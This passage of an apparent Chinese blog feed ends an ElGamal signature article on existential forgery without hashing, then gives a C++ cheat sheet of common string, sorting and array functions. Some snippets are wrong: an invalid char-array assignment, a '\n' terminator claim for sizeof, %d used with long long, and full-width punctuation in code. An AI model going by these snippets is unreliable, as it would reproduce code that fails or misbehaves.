\equiv su(mod \ p)$,则消息 m 及其签名(r,s)可以被验证者接受,即攻击者成功进行存在性伪造。这是因为<br>$$<br>y^rr^s \equiv y^r(g^ug^v)^s \equiv y^{r + sv}·g^{us} \equiv y^{r+(-rv^{-1})}·g^{su} \equiv g^m(mod \ p)<br>$$<br>又因为$g^m \equiv g^{su}(mod \ p)$也就是说,签名(r,s)使等式$y^rr^s \equiv g^m(mod \ p)$成立。可见,使用 Hash 函数能够有效地提高 EIGamal 数字签名方案的安全性。</p></li></ol>]]></content>
    
    
    <summary type="html">基于离散对数的签名方案之ElGamal及用C++实现</summary>
    
    
    
    <category term="密码学" scheme="https://nonevector.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
    <category term="RSA算法" scheme="https://nonevector.top/tags/RSA%E7%AE%97%E6%B3%95/"/>
    
    <category term="数字签名" scheme="https://nonevector.top/tags/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/"/>
    
  </entry>
  
  <entry>
    <title>C++常用函数</title>
    <link href="https://nonevector.top/posts/16.html"/>
    <id>https://nonevector.top/posts/16.html</id>
    <published>2023-11-18T09:14:43.091Z</published>
    <updated>2023-12-10T10:30:49.455Z</updated>
    
    <content type="html"><![CDATA[<h2 id="String-类型和-int-类型转换">String 类型和 int 类型转换</h2><h3 id="1-String-int">1. String -&gt; int</h3><p>1.使用<strong>stoi()</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">string <span class="title">s</span><span class="params">(<span class="string">&quot;12345&quot;</span>)</span></span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> a = <span class="built_in">stoi</span>(s);</span><br><span class="line">cout &lt;&lt; a &lt;&lt; endl;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.使用<strong>atoi()</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> str3[<span class="number">10</span>] = <span class="string">&quot;3245345&quot;</span>;</span><br><span class="line"><span class="comment">//数字简单，所以转数字一个参数</span></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> a = <span class="built_in">atoi</span>(str3);</span><br><span class="line">cout &lt;&lt; a &lt;&lt; endl;</span><br></pre></td></tr></table></figure><p>3.使用 <strong>sscanf()</strong> 映射</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="type">long</span> c = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> str5[<span class="number">10</span>] = <span class="string">&quot;661234544&quot;</span>;</span><br><span class="line"><span class="built_in">sscanf</span>(str5, <span class="string">&quot;%d&quot;</span>, &amp;c); <span class="comment">//从左至右，字符串转数字</span></span><br><span class="line">cout &lt;&lt; c &lt;&lt; endl;</span><br></pre></td></tr></table></figure><h3 id="2-int-String">2.int -&gt; String</h3><p>1.使用 c++里的 to_string()</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="type">long</span> m = <span class="number">1234566700</span>;</span><br><span class="line">string str = <span class="built_in">to_string</span>(m);   <span class="comment">//系统提供数字转字符</span></span><br><span class="line">cout &lt;&lt; str &lt;&lt; endl;</span><br></pre></td></tr></table></figure><p>2.使用<strong>itoa()</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> n = <span class="number">100</span>;</span><br><span class="line"><span class="type">char</span> str2[<span class="number">10</span>];</span><br><span class="line"><span class="comment">//字符串比较麻烦，所以转字符串三个参数，我是这么记得(手动滑稽）</span></span><br><span class="line"><span class="built_in">itoa</span>(n,str2,<span class="number">10</span>); <span class="comment">//第一个参数为整数，第二个为字符串(char*)，第三个为进制</span></span><br><span class="line">cout &lt;&lt; str2 &lt;&lt; endl;</span><br></pre></td></tr></table></figure><p>3.使用 sprintf() 映射</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="type">long</span> b = <span class="number">1234560</span>;</span><br><span class="line"><span class="type">char</span> str4[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">sprintf</span>(str4, <span class="string">&quot;%d&quot;</span>, b); <span class="comment">//从右至左，把数转换为字符串</span></span><br><span class="line">cout &lt;&lt; str4 &lt;&lt; endl;</span><br></pre></td></tr></table></figure><h2 id="判断字符类型">判断字符类型</h2><p>1、isalpha(x) 判断 x 是否为字母</p><p>2、isdigit(x) 判断 x 是否为数字</p><p>3、islower(x) 判断 x 是否为小写字母</p><p>4、isupper(x) 判断 x 是否为大写字母</p><p>5、isalnum(x) 判断 x 是否为字母或数字</p><p>6、ispunct(x) 判断 x 是否为标点符号</p><p>7、isspace(x) 判断 x 是否为空格</p><h2 id="排序函数-sort">排序函数 sort</h2><p>void sort (RandomAccessIterator first, RandomAccessIterator last, Compare comp);</p><p>（1）第一个参数 first：是要排序的数组的起始地址。</p><p>（2）第二个参数 last：是结束的地址（最后一个数据的后一个数据的地址）</p><p>（3）第三个参数 comp 是排序的方法：可以是从升序也可是降序。如果第三个参数不写，则默认的排序方法是从小到大排序。</p><p>元素自身包含了比较关系，如 int，double 等基础类型，可以直接进行比较 greater<int>() 递减， less<int>() 递增</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> s[]=&#123;<span class="number">34</span>,<span class="number">56</span>,<span class="number">11</span>,<span class="number">23</span>,<span class="number">45</span>&#125;;</span><br><span class="line"></span><br><span class="line">   vector&lt;<span class="type">int</span>&gt;<span class="built_in">arr</span>(s,s+<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">sort</span>(arr.<span class="built_in">begin</span>(),arr.<span class="built_in">end</span>(),<span class="built_in">greater</span>&lt;<span class="type">int</span>&gt;());</span><br></pre></td></tr></table></figure><p>元素本身为 class 或者 struct，类内部需要重载&lt; 运算符，实现元素的比较；</p><h2 id="求平方根">求平方根</h2><p>头文件：#include &lt;math.h&gt;</p><p>sqrt() 用来求给定值的平方根，其原型为：</p><p>double sqrt(double x);</p><h2 id="判断数组长度">判断数组长度</h2><h3 id="1-string-类型">1.string 类型</h3><ol><li><p>size() <s>个人比较常用</s></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string a = <span class="string">&quot;abc&quot;</span>;</span><br><span class="line">cout &lt;&lt; a.<span class="built_in">size</span>(); <span class="comment">// a = 3</span></span><br></pre></td></tr></table></figure><p>2.length()</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string b = <span class="string">&quot;abc&quot;</span>;</span><br><span class="line">    cout &lt;&lt; b.<span class="built_in">length</span>(); <span class="comment">// b =3</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="2-char-类型">2.char 类型</h3><ol><li><p>strlen</p><p>头文件是<cstring></p><p>strlen 是一个函数，它用来计算指定字符串 str 的长度，但不包括结束字符（即 null 字符）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> s1[<span class="number">505</span>];</span><br><span class="line"></span><br><span class="line">s1=<span class="number">123456</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> la=<span class="built_in">strlen</span>(s1);<span class="comment">//a1=6</span></span><br></pre></td></tr></table></figure></li><li><p>sizeof</p><p>实际上是得到的值是 类型长度 * 长度</p><p>因为 char 的每个字符长 1，所以可以直接用</p><p>但比如 int 每个字符长 4，得到的值为 4 * 长度</p><p>会自动+1 是因为最后一个是 ‘\n’</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> str[]=<span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">cout &lt;&lt; <span class="built_in">sizeof</span>(str); <span class="comment">//12</span></span><br><span class="line"><span class="type">int</span> a[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br><span class="line">cout &lt;&lt; <span class="built_in">sizeof</span>(a); <span class="comment">// 12</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="求绝对值">求绝对值</h2><p>abs() 是用来求整型表达式的绝对值</p><p>fabs() 是用来求浮点型表达式的绝对值</p><h2 id="求次方">求次方</h2><h3 id="1-数值较小，不求幂">1. 数值较小，不求幂</h3><p>pow() 函数用来求 x 的 y 次幂（次方），其原型为：</p><p>double pow(double x, double y);</p><p>pow()用来计算以 x 为底的 y 次方值，然后将结果返回。设返回值为 ret，则 ret = xy。</p><h3 id="2-数值较大，求幂">2.数值较大，求幂</h3><p>快速幂</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">qmi</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> k, <span class="type">int</span> p)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(k)&#123;</span><br><span class="line">        <span class="keyword">if</span>(k &amp; <span class="number">1</span>) res = (LL)res * a % p;</span><br><span class="line">        k &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">        a = (LL)a * a % p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="给全数组赋值">给全数组赋值</h2><p>memset()函数原型是 extern void *memset(void *buffer, int c, int count)</p><p>buffer：为指针或是数组 c：是赋给 buffer 的值 count：是 buffer 的长度.</p><p>这个函数在 socket 中多用于清空数组.如:原型是 memset(buffer, 0, sizeof(buffer))</p><p>memset 用来对一段内存空间全部设置为某个字符，一般用在对定义的字符串进行初始化为‘ ’或‘/0’；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span>;</span><br><span class="line"><span class="type">int</span> dist[N];</span><br><span class="line"><span class="built_in">memset</span>(dist, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> dist);</span><br></pre></td></tr></table></figure><h2 id="读取字符">读取字符</h2><h3 id="1-读取到某个字符为止">1.读取到某个字符为止</h3><p>getline</p><p>头文件：#include <string></p><p>istream&amp; getline ( istream &amp;is , string &amp;str , char delim );</p><p>其中，istream &amp;is 表示一个输入流，譬如 cin；</p><p>string&amp;str 表示把从输入流读入的字符串存放在这个字符串中（可以自己随便命名，str 什么的都可以）；</p><p>char delim 表示遇到这个字符停止读入，在不设置的情况下系统默认该字符为’\n’，也就是回车换行符（遇到回车停止读入）。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string line;</span><br><span class="line"><span class="built_in">getline</span>(cin, line, <span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">cout &lt;&lt; line;</span><br><span class="line"><span class="comment">// 当我输入的是 YYDS#NoneVector，输出的是YYDS</span></span><br></pre></td></tr></table></figure><h3 id="2-读取到某个条件为止">2.读取到某个条件为止</h3><p>循环输入，直到符合某种条件时结束输入。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)</span><br><span class="line">&#123;</span><br><span class="line">    cout &lt;&lt; n;</span><br><span class="line">    <span class="keyword">if</span>(flag) <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="全排序">全排序</h2><p>STL 提供了两个用来计算排列组合关系的算法，分别是 next_permutation 和 prev_permutation。首先我们必须了解什么是“下一个”排列组合，什么是“前一个”排列组合。考虑三个字符所组成的序列{a,b,c}。</p><p>这个序列有六个可能的排列组合：abc，acb，bac，bca，cab，cba。这些排列组合根据 less-than 操作符做字典顺序(lexicographical)的排序。也就是说，abc 名列第一，因为每一个元素都小于其后的元素。acb 是次一个排列组合，因为它是固定了 a(序列内最小元素)之后所做的新组合。</p><p>同样道理，那些固定 b(序列中次小元素)而做的排列组合，在次序上将先于那些固定 c 而做的排列组合。以 bac 和 bca 为例，bac 在 bca 之前，因为次序 ac 小于序列 ca。面对 bca，我们可以说其前一个排列组合是 bac，而其后一个排列组合是 cab。序列 abc 没有“前一个”排列组合，cba 没有“后一个”排列组合。</p><h3 id="1-正序">1.正序</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> ans[<span class="number">4</span>]=&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">3</span>&#125;;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;++i)</span><br><span class="line">cout&lt;&lt;ans[i]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">cout&lt;&lt;endl;</span><br><span class="line">&#125;<span class="keyword">while</span>(<span class="built_in">next_permutation</span>(ans,ans+<span class="number">4</span>)); <span class="comment">//与sort同理</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">4</span> <span class="number">3</span></span><br><span class="line"><span class="number">1</span> <span class="number">3</span> <span class="number">2</span> <span class="number">4</span></span><br><span class="line"><span class="number">1</span> <span class="number">3</span> <span class="number">4</span> <span class="number">2</span></span><br><span class="line"><span class="number">1</span> <span class="number">4</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"><span class="number">1</span> <span class="number">4</span> <span class="number">3</span> <span class="number">2</span></span><br><span class="line"><span class="number">2</span> <span class="number">1</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"><span class="number">2</span> <span class="number">1</span> <span class="number">4</span> <span class="number">3</span></span><br><span class="line"><span class="number">2</span> <span class="number">3</span> <span class="number">1</span> <span class="number">4</span></span><br><span class="line"><span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">1</span></span><br><span class="line"><span class="number">2</span> <span class="number">4</span> <span class="number">1</span> <span class="number">3</span></span><br><span class="line"><span class="number">2</span> <span class="number">4</span> <span class="number">3</span> <span class="number">1</span></span><br><span class="line"><span class="number">3</span> <span class="number">1</span> <span class="number">2</span> <span class="number">4</span></span><br><span class="line"><span class="number">3</span> <span class="number">1</span> <span class="number">4</span> <span class="number">2</span></span><br><span class="line"><span class="number">3</span> <span class="number">2</span> <span class="number">1</span> <span class="number">4</span></span><br><span class="line"><span class="number">3</span> <span class="number">2</span> <span class="number">4</span> <span class="number">1</span></span><br><span class="line"><span class="number">3</span> <span class="number">4</span> <span class="number">1</span> <span class="number">2</span></span><br><span class="line"><span class="number">3</span> <span class="number">4</span> <span class="number">2</span> <span class="number">1</span></span><br><span class="line"><span class="number">4</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"><span class="number">4</span> <span class="number">1</span> <span class="number">3</span> <span class="number">2</span></span><br><span class="line"><span class="number">4</span> <span class="number">2</span> <span class="number">1</span> <span class="number">3</span></span><br><span class="line"><span class="number">4</span> <span class="number">2</span> <span class="number">3</span> <span class="number">1</span></span><br><span class="line"><span class="number">4</span> <span class="number">3</span> <span class="number">1</span> <span class="number">2</span></span><br><span class="line"><span class="number">4</span> <span class="number">3</span> <span class="number">2</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="2-逆序">2.逆序</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> ans[<span class="number">4</span>]=&#123;<span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;++i)</span><br><span class="line">cout&lt;&lt;ans[i]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">cout&lt;&lt;endl;</span><br><span class="line">&#125;<span class="keyword">while</span>(<span class="built_in">prev_permutation</span>(ans,ans+<span class="number">4</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span> <span class="number">3</span> <span class="number">2</span> <span class="number">1</span></span><br><span class="line"><span class="number">4</span> <span class="number">3</span> <span class="number">1</span> <span class="number">2</span></span><br><span class="line"><span class="number">4</span> <span class="number">2</span> <span class="number">3</span> <span class="number">1</span></span><br><span class="line"><span class="number">4</span> <span class="number">2</span> <span class="number">1</span> <span class="number">3</span></span><br><span class="line"><span class="number">4</span> <span class="number">1</span> <span class="number">3</span> <span class="number">2</span></span><br><span class="line"><span class="number">4</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"><span class="number">3</span> <span class="number">4</span> <span class="number">2</span> <span class="number">1</span></span><br><span class="line"><span class="number">3</span> <span class="number">4</span> <span class="number">1</span> <span class="number">2</span></span><br><span class="line"><span class="number">3</span> <span class="number">2</span> <span class="number">4</span> <span class="number">1</span></span><br><span class="line"><span class="number">3</span> <span class="number">2</span> <span class="number">1</span> <span class="number">4</span></span><br><span class="line"><span class="number">3</span> <span class="number">1</span> <span class="number">4</span> <span class="number">2</span></span><br><span class="line"><span class="number">3</span> <span class="number">1</span> <span class="number">2</span> <span class="number">4</span></span><br><span class="line"><span class="number">2</span> <span class="number">4</span> <span class="number">3</span> <span class="number">1</span></span><br><span class="line"><span class="number">2</span> <span class="number">4</span> <span class="number">1</span> <span class="number">3</span></span><br><span class="line"><span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">1</span></span><br><span class="line"><span class="number">2</span> <span class="number">3</span> <span class="number">1</span> <span class="number">4</span></span><br><span class="line"><span class="number">2</span> <span class="number">1</span> <span class="number">4</span> <span class="number">3</span></span><br><span class="line"><span class="number">2</span> <span class="number">1</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"><span class="number">1</span> <span class="number">4</span> <span class="number">3</span> <span class="number">2</span></span><br><span class="line"><span class="number">1</span> <span class="number">4</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"><span class="number">1</span> <span class="number">3</span> <span class="number">4</span> <span class="number">2</span></span><br><span class="line"><span class="number">1</span> <span class="number">3</span> <span class="number">2</span> <span class="number">4</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">4</span> <span class="number">3</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="大小写转换">大小写转换</h2><h3 id="1-toupper-tolower">1.toupper / tolower</h3><p>1、toupper(x) 如果 x 是小写字母，将其转换成大写字母</p><p>2、tolower(x) 如果 x 是大写字母，将其转换成小写字母</p><blockquote><p>​ <strong>非字母字符不做出处理</strong></p><p>返回的值是 int 类型</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string a = <span class="string">&quot;aBc&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; a.<span class="built_in">size</span>(); i ++ ) a[i] = <span class="built_in">tolower</span>(a[i]);</span><br><span class="line">cout &lt;&lt; a &lt;&lt; endl;<span class="comment">// a = abc</span></span><br></pre></td></tr></table></figure><h3 id="2-transform">2.transform</h3><p>１、如果使用 string 类，可以使用#include <algorithm>里的如下方法进行大小写转换；</p><p>transform(str.begin(),str.end(),str.begin(),::tolower);</p><p>记得::tolower 前面有::,　而且是::tolower，不是::tolower()</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">string str;</span><br><span class="line">cin&gt;&gt;str;</span><br><span class="line"><span class="comment">///转小写</span></span><br><span class="line"><span class="built_in">transform</span>(str.<span class="built_in">begin</span>(),str.<span class="built_in">end</span>(),str.<span class="built_in">begin</span>(),::tolower);</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;转化为小写后为：&quot;</span>&lt;&lt;str&lt;&lt;endl;</span><br><span class="line"><span class="built_in">transform</span>(str.<span class="built_in">begin</span>(),str.<span class="built_in">end</span>(),str.<span class="built_in">begin</span>(),::toupper);</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;转化为大写后为：&quot;</span>&lt;&lt;str&lt;&lt;endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><h2 id="连接数组">连接数组</h2><h3 id="1-string">1.string</h3><p>直接相加</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string a = <span class="string">&quot;ab&quot;</span>;</span><br><span class="line">string b = <span class="string">&quot;bc&quot;</span>;</span><br><span class="line">string c = a + b; <span class="comment">// c = abbc</span></span><br></pre></td></tr></table></figure><h3 id="2-char">2. char</h3><p>strcat 函数</p><p>其一般形式为：strcat(字符数组 1，字符数组 2)</p><p>strcat 的作用是连接两个字符数组中的字符串，把字符串 2 接到字符串 1 的后面，结果放在字符数组 1 中，函数调用后得到一个函数值——字符数组 1 的地址。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> str1［<span class="number">30</span>］=&#123;″People′s  Republic  of  ″&#125;;</span><br><span class="line"><span class="type">char</span> str2［］=&#123;″China″&#125;;</span><br><span class="line"><span class="built_in">printf</span>(″%s″，<span class="built_in">strcat</span>(str1，str2));</span><br><span class="line"><span class="comment">//输出：</span></span><br><span class="line"><span class="comment">//People′s Republic of China</span></span><br></pre></td></tr></table></figure><h2 id="复制数组">复制数组</h2><h3 id="1-char">1.char</h3><ol><li><p>strcpy 函数</p><p>其一般形式为：strcpy(字符数组 1，字符串 2)</p><p>strcpy 是“字符串复制函数”。</p><p>作用:是将字符串 2 复制到字符数组 1 中去。例如：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> str1[<span class="number">15</span>],str2[]=&#123;<span class="string">&quot;China2&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcpy</span>(str1,<span class="string">&quot;china&quot;</span>);</span><br><span class="line">cout &lt;&lt; str1 &lt;&lt; endl;<span class="comment">//china</span></span><br><span class="line"><span class="built_in">strcpy</span>(str1,str2);</span><br><span class="line">cout &lt;&lt; str1 &lt;&lt; endl;<span class="comment">//China2</span></span><br></pre></td></tr></table></figure><p>（1）字符数组 1 必须定义得足够大，以便容纳被复制的字符串。字符数组 1 的长度不应小于字符串 2 的长度。</p><p>（2）“字符数组 1”必须写成数组名形式(如 str1)，</p><p>“字符串 2”可以是字符数组名，也可以是一个字符串常量。如：strcpy(str1，″China″)；</p><p>（3）复制时连同字符串后面的′＼0′一起复制到字符数组 1 中。</p></li><li><p>strncpy 函数</p><p>例如:strncpy(str1，str2，2);作用是将 str2 中前面 2 个字符复制到 str1 中去，然后再加一个‘＼0’。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> str1[<span class="number">15</span>],str2[]=&#123;<span class="string">&quot;China2&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcpy</span>(str1,<span class="string">&quot;china&quot;</span>);</span><br><span class="line">cout &lt;&lt; str1 &lt;&lt; endl;<span class="comment">//china</span></span><br><span class="line"><span class="built_in">strncpy</span>(str1,str2, <span class="number">2</span>);</span><br><span class="line">cout &lt;&lt; str1 &lt;&lt; endl;<span class="comment">//China 大写C</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="比较字符串">比较字符串</h2><p>strcmp 函数</p><p>其一般形式为：strcmp(字符串 1，字符串 2)</p><p>strcmp 的作用是比较字符串 1 和字符串 2。</p><p>例如：strcmp(str1，str2);</p><p>​ strcmp(″China″，″Korea″);</p><p>​ strcmp(str1，″Beijing″);</p><p>比较的结果由函数值带回</p><p>(1) 如果字符串 1=字符串 2，函数值为 0。</p><p>(2) 如果字符串 1&gt;字符串 2，函数值为一正整数。</p><p>(3) 如果字符串 1&lt;字符串 2，函数值为一负整数。</p>]]></content>
    
    
    <summary type="html">个人写c++常用的函数</summary>
    
    
    
    <category term="随记" scheme="https://nonevector.top/categories/%E9%9A%8F%E8%AE%B0/"/>
    
    
    <category term="Markdown" scheme="https://nonevector.top/tags/Markdown/"/>
    
    <category term="Latex" scheme="https://nonevector.top/tags/Latex/"/>
    
  </entry>
  
